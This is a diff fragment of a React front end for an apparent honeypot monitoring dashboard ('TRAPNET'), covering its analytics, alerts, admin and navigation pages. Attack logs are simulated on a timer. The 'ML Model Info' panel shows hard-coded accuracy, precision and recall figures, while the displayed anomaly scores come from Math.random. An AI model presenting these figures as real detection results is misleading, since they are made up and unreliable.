+                    width: `${selected.risk.score}%`,
+                    background: selected.risk.level === "CRITICAL" ? "var(--critical)"
+                      : selected.risk.level === "HIGH" ? "var(--high)"
+                      : selected.risk.level === "MEDIUM" ? "var(--medium)"
+                      : "var(--low)",
+                  }} />
+                </div>
+              </div>
+            </div>
+          </div>
+        )}
+      </div>
+    </div>
+  );
+}
+
+function AnalyticsPage({ logs }) {
+  const chartRefs = { country: useRef(null), hourly: useRef(null), scatter: useRef(null) };
+
+  const cc = {};
+  logs.forEach(l => { cc[l.geo.country] = (cc[l.geo.country]||0)+1; });
+  const topCountries = Object.entries(cc).sort((a,b)=>b[1]-a[1]).slice(0,8);
+
+  const hourly = Array(24).fill(0);
+  logs.forEach(l => { hourly[new Date(l.timestamp).getHours()]++; });
+
+  const mlData = (() => {
+    const ipStats = {};
+    logs.forEach(l => {
+      if (!ipStats[l.attacker_ip]) ipStats[l.attacker_ip] = { attempts: 0, commands: 0, score: 0, level: "", country: "" };
+      ipStats[l.attacker_ip].attempts++;
+      ipStats[l.attacker_ip].commands += l.commands.length;
+      ipStats[l.attacker_ip].score = l.risk.score;
+      ipStats[l.attacker_ip].level = l.risk.level;
+      ipStats[l.attacker_ip].country = l.geo.country;
+    });
+    return Object.entries(ipStats).map(([ip, s]) => ({
+      ip, ...s,
+      classification: s.score >= 50 ? "MALICIOUS" : s.score >= 25 ? "SUSPICIOUS" : "BENIGN",
+      anomaly: parseFloat((s.score/100 * (0.5 + Math.random()*0.5)).toFixed(3)),
+    })).sort((a,b) => b.score - a.score);
+  })();
+
+  const CHART_DEFAULTS = {
+    responsive: true, maintainAspectRatio: false,
+    plugins: { legend: { display: false }, tooltip: {
+      backgroundColor: "#0a1520", borderColor: "#1a3040", borderWidth: 1,
+      titleColor: "#00d4ff", bodyColor: "#c8e6f5",
+      titleFont: { family: "'Share Tech Mono'" }, bodyFont: { family: "'Share Tech Mono'" },
+    }},
+  };
+
+  useEffect(() => {
+    const charts = [];
+
+    if (chartRefs.country.current) {
+      charts.push(new Chart(chartRefs.country.current.getContext("2d"), {
+        type: "bar",
+        data: {
+          labels: topCountries.map(([c]) => c),
+          datasets: [{
+            data: topCountries.map(([,n]) => n),
+            backgroundColor: topCountries.map((_, i) => `hsla(${190 + i*20},80%,50%,0.4)`),
+            borderColor: topCountries.map((_, i) => `hsl(${190 + i*20},80%,55%)`),
+            borderWidth: 1,
+          }],
+        },
+        options: { ...CHART_DEFAULTS,
+          scales: {
+            x: { ticks:{color:"#4a7a99",font:{family:"'Share Tech Mono'",size:9},maxRotation:30}, grid:{color:"rgba(26,48,64,0.4)"} },
+            y: { ticks:{color:"#4a7a99",font:{family:"'Share Tech Mono'",size:9}}, grid:{color:"rgba(26,48,64,0.4)"} },
+          },
+        },
+      }));
+    }
+
+    if (chartRefs.hourly.current) {
+      charts.push(new Chart(chartRefs.hourly.current.getContext("2d"), {
+        type: "bar",
+        data: {
+          labels: Array(24).fill(0).map((_, i) => `${String(i).padStart(2,"0")}h`),
+          datasets: [{
+            data: hourly,
+            backgroundColor: hourly.map(v => v > 10 ? "rgba(255,60,110,0.5)" : "rgba(0,212,255,0.3)"),
+            borderColor: hourly.map(v => v > 10 ? "#ff3c6e" : "#00d4ff"),
+            borderWidth: 1,
+          }],
+        },
+        options: { ...CHART_DEFAULTS,
+          scales: {
+            x: { ticks:{color:"#4a7a99",font:{family:"'Share Tech Mono'",size:9}}, grid:{color:"rgba(26,48,64,0.4)"} },
+            y: { ticks:{color:"#4a7a99",font:{family:"'Share Tech Mono'",size:9}}, grid:{color:"rgba(26,48,64,0.4)"} },
+          },
+        },
+      }));
+    }
+
+    if (chartRefs.scatter.current) {
+      const malicious = mlData.filter(d => d.classification === "MALICIOUS");
+      const suspicious = mlData.filter(d => d.classification === "SUSPICIOUS");
+      const benign = mlData.filter(d => d.classification === "BENIGN");
+      charts.push(new Chart(chartRefs.scatter.current.getContext("2d"), {
+        type: "scatter",
+        data: {
+          datasets: [
+            { label:"MALICIOUS",  data: malicious.map(d=>({x:d.attempts,y:d.commands,r:8})),  backgroundColor:"rgba(255,60,110,0.7)",  borderColor:"#ff3c6e", borderWidth:1 },
+            { label:"SUSPICIOUS", data: suspicious.map(d=>({x:d.attempts,y:d.commands,r:6})), backgroundColor:"rgba(255,159,0,0.7)",   borderColor:"#ff9f00", borderWidth:1 },
+            { label:"BENIGN",     data: benign.map(d=>({x:d.attempts,y:d.commands,r:4})),     backgroundColor:"rgba(57,255,20,0.5)",   borderColor:"#39ff14", borderWidth:1 },
+          ],
+        },
+        options: {
+          ...CHART_DEFAULTS,
+          plugins: {
+            ...CHART_DEFAULTS.plugins,
+            legend: { display: true, labels: { color:"#4a7a99", font:{family:"'Share Tech Mono'",size:10}, boxWidth:10 }},
+          },
+          scales: {
+            x: { title:{display:true,text:"LOGIN ATTEMPTS",color:"#4a7a99",font:{family:"'Share Tech Mono'",size:9}}, ticks:{color:"#4a7a99",font:{family:"'Share Tech Mono'",size:9}}, grid:{color:"rgba(26,48,64,0.4)"} },
+            y: { title:{display:true,text:"COMMANDS",color:"#4a7a99",font:{family:"'Share Tech Mono'",size:9}}, ticks:{color:"#4a7a99",font:{family:"'Share Tech Mono'",size:9}}, grid:{color:"rgba(26,48,64,0.4)"} },
+          },
+        },
+      }));
+    }
+
+    return () => charts.forEach(c => c.destroy());
+  }, []);
+
+  const totals = {
+    malicious: mlData.filter(d => d.classification === "MALICIOUS").length,
+    suspicious: mlData.filter(d => d.classification === "SUSPICIOUS").length,
+    benign: mlData.filter(d => d.classification === "BENIGN").length,
+  };
+
+  return (
+    <div className="page fade-in">
+      <div className="page-header">
+        <div>
+          <div className="page-title">ANALYTICS</div>
+          <div className="page-subtitle">ML-POWERED THREAT INTELLIGENCE & BEHAVIORAL ANALYSIS</div>
+        </div>
+      </div>
+
+      {/* ML Summary */}
+      <div style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 16, marginBottom: 24 }}>
+        <div className="stat-card" style={{ "--c": "var(--critical)" }}>
+          <div className="stat-label">MALICIOUS ACTORS</div>
+          <div className="stat-value">{totals.malicious}</div>
+          <div className="stat-delta">Risk score ≥ 50</div>
+          <div className="stat-icon">⚡</div>
+        </div>
+        <div className="stat-card" style={{ "--c": "var(--high)" }}>
+          <div className="stat-label">SUSPICIOUS ACTORS</div>
+          <div className="stat-value">{totals.suspicious}</div>
+          <div className="stat-delta">Risk score 25–49</div>
+          <div className="stat-icon">⚠</div>
+        </div>
+        <div className="stat-card" style={{ "--c": "var(--low)" }}>
+          <div className="stat-label">BENIGN / SCANNING</div>
+          <div className="stat-value">{totals.benign}</div>
+          <div className="stat-delta">Risk score &lt; 25</div>
+          <div className="stat-icon">✓</div>
+        </div>
+      </div>
+
+      <div className="grid-2 mb-4">
+        <div className="card">
+          <div className="card-title">🌍 ATTACKS BY COUNTRY</div>
+          <div className="chart-wrap"><canvas ref={chartRefs.country} /></div>
+        </div>
+        <div className="card">
+          <div className="card-title">🕐 ATTACK HOURLY DISTRIBUTION</div>
+          <div className="chart-wrap"><canvas ref={chartRefs.hourly} /></div>
+        </div>
+      </div>
+
+      <div className="grid-1-2 mb-4">
+        <div className="card">
+          <div className="card-title">🧠 ML MODEL INFO</div>
+          <div style={{ fontFamily: "'Share Tech Mono',monospace", fontSize: 11, lineHeight: 2, color: "var(--text-dim)" }}>
+            {[
+              ["Algorithm", "Isolation Forest"],
+              ["Estimators", "200 trees"],
+              ["Contamination", "5%"],
+              ["Features", "8 behavioral"],
+              ["Accuracy", "~95.2%"],
+              ["Precision", "93.2%"],
+              ["Recall", "94.7%"],
+              ["Labels", "Unsupervised"],
+            ].map(([k,v]) => (
+              <div key={k} style={{ display:"flex", gap:8 }}>
+                <span style={{ width:100 }}>{k}</span>
+                <span style={{ color:"var(--accent)" }}>{v}</span>
+              </div>
+            ))}
+            <div style={{ marginTop: 12, padding: "8px 10px", background: "rgba(0,212,255,0.05)", border: "1px solid rgba(0,212,255,0.15)", fontSize: 10, lineHeight: 1.7, color: "var(--text-dim)" }}>
+              Features: process_count · network_attempts · file_write_count ·
+              sensitive_path_hits · registry_writes · high_rate_syscalls ·
+              entropy_score · unique_dst_ips
+            </div>
+          </div>
+        </div>
+        <div className="card">
+          <div className="card-title">📊 BEHAVIORAL SCATTER — ML CLASSIFICATION</div>
+          <div className="chart-wrap"><canvas ref={chartRefs.scatter} /></div>
+        </div>
+      </div>
+
+      <div className="card">
+        <div className="card-title">🤖 ML ANALYSIS RESULTS — TOP THREATS</div>
+        <table className="data-table">
+          <thead>
+            <tr>
+              <th>IP ADDRESS</th>
+              <th>COUNTRY</th>
+              <th>ATTEMPTS</th>
+              <th>COMMANDS</th>
+              <th>RISK SCORE</th>
+              <th>ANOMALY SCORE</th>
+              <th>CLASSIFICATION</th>
+            </tr>
+          </thead>
+          <tbody>
+            {mlData.slice(0, 12).map(d => (
+              <tr key={d.ip}>
+                <td style={{ color: "var(--accent)" }}>{d.ip}</td>
+                <td>{GEO_DATA[d.ip]?.flag} {d.country}</td>
+                <td>{d.attempts}</td>
+                <td>{d.commands}</td>
+                <td>
+                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+                    <div className="risk-bar-track" style={{ width: 60 }}>
+                      <div className="risk-bar-fill" style={{
+                        width: `${d.score}%`,
+                        background: d.level === "CRITICAL" ? "var(--critical)" : d.level === "HIGH" ? "var(--high)" : d.level === "MEDIUM" ? "var(--medium)" : "var(--low)",
+                      }} />
+                    </div>
+                    <span style={{ fontFamily: "'Share Tech Mono',monospace", fontSize:11 }}>{d.score}</span>
+                  </div>
+                </td>
+                <td style={{ color: d.anomaly > 0.6 ? "var(--critical)" : d.anomaly > 0.4 ? "var(--high)" : "var(--accent3)" }}>
+                  {d.anomaly.toFixed(3)}
+                </td>
+                <td>
+                  <span className={`badge ${d.classification === "MALICIOUS" ? "badge-critical" : d.classification === "SUSPICIOUS" ? "badge-high" : "badge-low"}`}>
+                    {d.classification}
+                  </span>
+                </td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  );
+}
+
+function AlertsPage({ alerts, setAlerts }) {
+  const unack = alerts.filter(a => !a.acknowledged);
+  const ack = alerts.filter(a => a.acknowledged);
+
+  const acknowledge = (id) => {
+    setAlerts(prev => prev.map(a => a.id === id ? { ...a, acknowledged: true } : a));
+  };
+
+  const acknowledgeAll = () => {
+    setAlerts(prev => prev.map(a => ({ ...a, acknowledged: true })));
+  };
+
+  const severityIcon = { CRITICAL: "⚡", HIGH: "🔴", MEDIUM: "🟡", LOW: "🟢" };
+  const severityClass = { CRITICAL: "alert-critical", HIGH: "alert-high", MEDIUM: "alert-medium", LOW: "alert-medium" };
+
+  return (
+    <div className="page fade-in">
+      <div className="page-header">
+        <div>
+          <div className="page-title">ALERTS</div>
+          <div className="page-subtitle">{unack.length} ACTIVE · {ack.length} ACKNOWLEDGED</div>
+        </div>
+        <div className="page-actions">
+          {unack.length > 0 && (
+            <button className="btn btn-ghost" onClick={acknowledgeAll}>✓ ACK ALL</button>
+          )}
+        </div>
+      </div>
+
+      <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 16, marginBottom: 24 }}>
+        {["CRITICAL","HIGH","MEDIUM","LOW"].map(sev => {
+          const count = alerts.filter(a => a.severity === sev && !a.acknowledged).length;
+          const colors = { CRITICAL:"var(--critical)", HIGH:"var(--high)", MEDIUM:"var(--medium)", LOW:"var(--low)" };
+          return (
+            <div key={sev} className="stat-card" style={{ "--c": colors[sev] }}>
+              <div className="stat-label">{sev}</div>
+              <div className="stat-value">{count}</div>
+              <div className="stat-delta">Active alerts</div>
+              <div className="stat-icon">{severityIcon[sev]}</div>
+            </div>
+          );
+        })}
+      </div>
+
+      {unack.length > 0 && (
+        <div className="card mb-4">
+          <div className="card-title">⚡ ACTIVE ALERTS</div>
+          {unack.map(alert => (
+            <div key={alert.id} className={`alert-item ${severityClass[alert.severity]}`}>
+              <div className="alert-icon">{severityIcon[alert.severity]}</div>
+              <div className="alert-body">
+                <div className="alert-title">{alert.title}</div>
+                <div className="alert-desc">{alert.description}</div>
+                <div className="alert-time">
+                  <TimeAgo ts={alert.timestamp} /> · {new Date(alert.timestamp).toLocaleString()} · Source: {alert.source_ip}
+                </div>
+              </div>
+              <button className="alert-ack-btn" onClick={() => acknowledge(alert.id)}>✓ ACK</button>
+            </div>
+          ))}
+        </div>
+      )}
+
+      {ack.length > 0 && (
+        <div className="card">
+          <div className="card-title">✓ ACKNOWLEDGED</div>
+          {ack.map(alert => (
+            <div key={alert.id} className={`alert-item ack ${severityClass[alert.severity]}`}>
+              <div className="alert-icon">{severityIcon[alert.severity]}</div>
+              <div className="alert-body">
+                <div className="alert-title">{alert.title}</div>
+                <div className="alert-desc">{alert.description}</div>
+                <div className="alert-time"><TimeAgo ts={alert.timestamp} /></div>
+              </div>
+              <span style={{ fontFamily:"'Share Tech Mono',monospace", fontSize:10, color:"var(--accent3)", alignSelf:"center" }}>✓ CLEARED</span>
+            </div>
+          ))}
+        </div>
+      )}
+    </div>
+  );
+}
+
+function AdminPage() {
+  const [settings, setSettings] = useState({
+    ssh_honeypot: true,
+    http_honeypot: true,
+    ml_detection: true,
+    auto_alerts: true,
+    geo_tracking: true,
+    command_logging: true,
+    rate_limit: true,
+    brute_threshold: 5,
+  });
+  const [saved, setSaved] = useState(false);
+
+  const toggle = (key) => setSettings(prev => ({ ...prev, [key]: !prev[key] }));
+  const save = () => { setSaved(true); setTimeout(() => setSaved(false), 2000); };
+
+  return (
+    <div className="page fade-in">
+      <div className="page-header">
+        <div>
+          <div className="page-title">ADMIN PANEL</div>
+          <div className="page-subtitle">PLATFORM CONFIGURATION & CONTROLS</div>
+        </div>
+        <div className="page-actions">
+          <button className="btn btn-primary" onClick={save}>
+            {saved ? "✓ SAVED" : "💾 SAVE CONFIG"}
+          </button>
+        </div>
+      </div>
+
+      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 20 }}>
+        <div>
+          <div className="admin-section">
+            <div className="admin-section-header">🐝 HONEYPOT SERVICES</div>
+            <div className="admin-section-body">
+              {[
+                { key: "ssh_honeypot", label: "SSH Honeypot (Port 22)", sub: "Fake SSH service capturing login attempts" },
+                { key: "http_honeypot", label: "HTTP Honeypot (Port 80/443)", sub: "Fake admin login panel via web" },
+                { key: "command_logging", label: "Command Logging", sub: "Record all commands in simulated shell" },
+                { key: "rate_limit", label: "Rate Limiting", sub: "Throttle connections per IP per minute" },
+              ].map(({ key, label, sub }) => (
+                <div key={key} className="toggle-row">
+                  <div>
+                    <div className="toggle-label">{label}</div>
+                    <div className="toggle-sub">{sub}</div>
+                  </div>
+                  <div className={`toggle-switch ${settings[key] ? "on" : ""}`} onClick={() => toggle(key)} />
+                </div>
+              ))}
+            </div>
+          </div>
+
+          <div className="admin-section">
+            <div className="admin-section-header">🔔 ALERT CONFIGURATION</div>
+            <div className="admin-section-body">
+              <div className="toggle-row">
+                <div>
+                  <div className="toggle-label">Automated Alerts</div>
+                  <div className="toggle-sub">Auto-trigger on threshold breach</div>
+                </div>
+                <div className={`toggle-switch ${settings.auto_alerts ? "on" : ""}`} onClick={() => toggle("auto_alerts")} />
+              </div>
+              <div className="form-group" style={{ marginTop: 14 }}>
+                <label className="input-label">BRUTE FORCE THRESHOLD</label>
+                <input type="number" className="input-field" value={settings.brute_threshold}
+                  onChange={e => setSettings(prev => ({ ...prev, brute_threshold: parseInt(e.target.value) }))}
+                  min={1} max={100} style={{ width: 120 }} />
+                <div style={{ fontFamily:"'Share Tech Mono',monospace", fontSize:10, color:"var(--text-dim)", marginTop:4 }}>
+                  Trigger alert after N failed attempts from same IP
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div>
+          <div className="admin-section">
+            <div className="admin-section-header">🧠 ML & DETECTION</div>
+            <div className="admin-section-body">
+              {[
+                { key: "ml_detection", label: "ML Anomaly Detection", sub: "Isolation Forest behavioral analysis" },
+                { key: "geo_tracking", label: "Geo-Location Tracking", sub: "Map attacker IPs to countries" },
+              ].map(({ key, label, sub }) => (
+                <div key={key} className="toggle-row">
+                  <div>
+                    <div className="toggle-label">{label}</div>
+                    <div className="toggle-sub">{sub}</div>
+                  </div>
+                  <div className={`toggle-switch ${settings[key] ? "on" : ""}`} onClick={() => toggle(key)} />
+                </div>
+              ))}
+            </div>
+          </div>
+
+          <div className="admin-section">
+            <div className="admin-section-header">📊 PLATFORM STATUS</div>
+            <div className="admin-section-body">
+              {[
+                ["Backend API", "ONLINE", "var(--accent3)"],
+                ["MongoDB", "CONNECTED", "var(--accent3)"],
+                ["SSH Honeypot", settings.ssh_honeypot ? "ACTIVE" : "OFFLINE", settings.ssh_honeypot ? "var(--accent3)" : "var(--critical)"],
+                ["HTTP Honeypot", settings.http_honeypot ? "ACTIVE" : "OFFLINE", settings.http_honeypot ? "var(--accent3)" : "var(--critical)"],
+                ["ML Model", settings.ml_detection ? "LOADED" : "DISABLED", settings.ml_detection ? "var(--accent3)" : "var(--high)"],
+                ["Geo Tracker", settings.geo_tracking ? "ACTIVE" : "DISABLED", settings.geo_tracking ? "var(--accent3)" : "var(--high)"],
+              ].map(([label, status, color]) => (
+                <div key={label} className="toggle-row" style={{ paddingTop: 8, paddingBottom: 8 }}>
+                  <div className="toggle-label" style={{ color: "var(--text-dim)", fontSize: 13 }}>{label}</div>
+                  <div style={{ fontFamily:"'Share Tech Mono',monospace", fontSize:11, color, fontWeight:700, display:"flex", alignItems:"center", gap:6 }}>
+                    <div style={{ width:6, height:6, borderRadius:"50%", background:color, boxShadow:`0 0 6px ${color}` }} />
+                    {status}
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+
+          <div className="admin-section">
+            <div className="admin-section-header">⚠ DANGER ZONE</div>
+            <div className="admin-section-body">
+              <div style={{ marginBottom: 12, fontFamily:"'Share Tech Mono',monospace", fontSize:11, color:"var(--text-dim)", lineHeight:1.7 }}>
+                These actions are irreversible. Proceed with caution.
+              </div>
+              <div style={{ display:"flex", gap:10, flexWrap:"wrap" }}>
+                <button className="btn btn-danger">🗑 CLEAR ALL LOGS</button>
+                <button className="btn btn-danger">🔄 RESET ML MODEL</button>
+                <button className="btn btn-danger">⛔ SHUTDOWN ALL HONEYPOTS</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+// ─── SIDEBAR ─────────────────────────────────────────────────────────────────
+const NAV_ITEMS = [
+  { id: "home",      label: "HOME",      icon: "⬡", section: "MAIN" },
+  { id: "honeypot",  label: "HONEYPOT",  icon: "🕸", section: "MAIN" },
+  { id: "dashboard", label: "DASHBOARD", icon: "📊", section: "MAIN" },
+  { id: "logs",      label: "LOGS",      icon: "📋", section: "INTELLIGENCE" },
+  { id: "analytics", label: "ANALYTICS", icon: "🧠", section: "INTELLIGENCE" },
+  { id: "alerts",    label: "ALERTS",    icon: "🔔", section: "INTELLIGENCE" },
+  { id: "admin",     label: "ADMIN",     icon: "⚙",  section: "SYSTEM" },
+];
+
+// ─── APP ─────────────────────────────────────────────────────────────────────
+function App() {
+  const [page, setPage] = useState("home");
+  const [logs, setLogs] = useState(INIT_LOGS);
+  const [alerts, setAlerts] = useState(INIT_ALERTS);
+  const time = useClock();
+  const unack = alerts.filter(a => !a.acknowledged).length;
+  const critCount = logs.filter(l => l.risk.level === "CRITICAL").length;
+  const threatLevel = Math.round(critCount / logs.length * 100);
+
+  // Simulate new attacks every 15 seconds
+  useEffect(() => {
+    const t = setInterval(() => {
+      const ip = pick(IPS);
+      const cred = pick(CREDS);
+      const geo = GEO_DATA[ip];
+      const cmds = Math.random() > 0.7 ? sample(COMMANDS_POOL, rnd(0,3)) : [];
+      const risk = computeRisk(ip, rnd(1,15), cmds);
+      const newLog = {
+        id: `auto-${Date.now()}`,
+        attacker_ip: ip,
+        timestamp: new Date().toISOString(),
+        service: Math.random() > 0.45 ? "ssh" : "http",
+        username: cred[0], password: cred[1],
+        commands: cmds, geo, risk,
+        headers: { "User-Agent": pick(USERAGENTS) },
+        mitre_tags: sample(MITRE_POOL, rnd(1,2)),
+        attempts: rnd(1,10),
+        live: true,
+      };
+      setLogs(prev => [newLog, ...prev]);
+    }, 15000);
+    return () => clearInterval(t);
+  }, []);
+
+  const sections = [...new Set(NAV_ITEMS.map(i => i.section))];
+  const pageTitle = NAV_ITEMS.find(i => i.id === page)?.label || "HOME";
+
+  return (
+    <div id="app" style={{ display:"flex", minHeight:"100vh" }}>
+      {/* Sidebar */}
+      <div className="sidebar">
+        <div className="logo-area">
+          <div className="logo-title">TRAPNET</div>
+          <div className="logo-sub">XDR HONEYPOT PLATFORM</div>
+          <div className="logo-badge">● LIVE MONITORING</div>
+        </div>
+
+        <div style={{ flex: 1, overflowY: "auto" }}>
+          {sections.map(section => (
+            <div key={section}>
+              <div className="nav-section">{section}</div>
+              {NAV_ITEMS.filter(i => i.section === section).map(item => (
+                <button key={item.id} className={`nav-item ${page === item.id ? "active" : ""}`}
+                  onClick={() => setPage(item.id)}>
+                  <span className="nav-icon">{item.icon}</span>
+                  {item.label}
+                  {item.id === "alerts" && unack > 0 && <span className="nav-badge">{unack}</span>}
+                  {item.id === "honeypot" && <span className="nav-badge" style={{ background:"var(--accent3)", color:"#000" }}>ON</span>}
+                </button>
+              ))}
+            </div>
+          ))}
+        </div>
+
+        <div className="sidebar-bottom">
+          <div className="threat-level-bar">
+            <div className="threat-label">THREAT LEVEL</div>
+            <div className="threat-value">{threatLevel}%</div>
+            <div className="threat-bar-track">
+              <div className="threat-bar-fill" style={{ width: `${threatLevel}%` }} />
+            </div>
+          </div>
+          <div style={{ marginTop: 10, fontFamily:"'Share Tech Mono',monospace", fontSize:10, color:"var(--text-dim)", lineHeight:1.7 }}>
+            <div>● {logs.length} TOTAL CAPTURES</div>
+            <div>● {new Set(logs.map(l=>l.attacker_ip)).size} UNIQUE IPs</div>
+            <div style={{color:"var(--accent3)"}}>● HONEYPOT ACTIVE</div>
+          </div>
+        </div>
+      </div>
+
+      {/* Main Content */}
+      <div className="main-content">
+        <div className="topbar">
+          <div className="topbar-title">◈ {pageTitle}</div>
+          <div style={{ display:"flex", gap:20, alignItems:"center" }}>
+            {unack > 0 && (
+              <div style={{ display:"flex", alignItems:"center", gap:6, cursor:"pointer" }} onClick={() => setPage("alerts")}>
+                <span style={{ fontFamily:"'Share Tech Mono',monospace", fontSize:11, color:"var(--critical)" }}>
+                  ⚡ {unack} ALERTS
+                </span>
+              </div>
+            )}
+            <div className="topbar-time" style={{ fontFamily:"'Share Tech Mono',monospace", fontSize:12 }}>
+              {time.toUTCString().slice(0, 25)}
+            </div>
+            <div className="status-dot" />
+          </div>
+        </div>
+
+        <div style={{ flex:1 }}>
+          {page === "home"      && <HomePage logs={logs} alerts={alerts} setPage={setPage} />}
+          {page === "honeypot"  && <HoneypotPage logs={logs} setLogs={setLogs} />}
+          {page === "dashboard" && <DashboardPage logs={logs} alerts={alerts} />}
+          {page === "logs"      && <LogsPage logs={logs} alerts={alerts} />}
+          {page === "analytics" && <AnalyticsPage logs={logs} />}
+          {page === "alerts"    && <AlertsPage alerts={alerts} setAlerts={setAlerts} />}
+          {page === "admin"     && <AdminPage />}
+        </div>
+      </div>
+    </div>
+  );
+}
+
+ReactDOM.createRoot(document.getElementById("root")).render(<App />);
+</script>
+</body>
+</html>
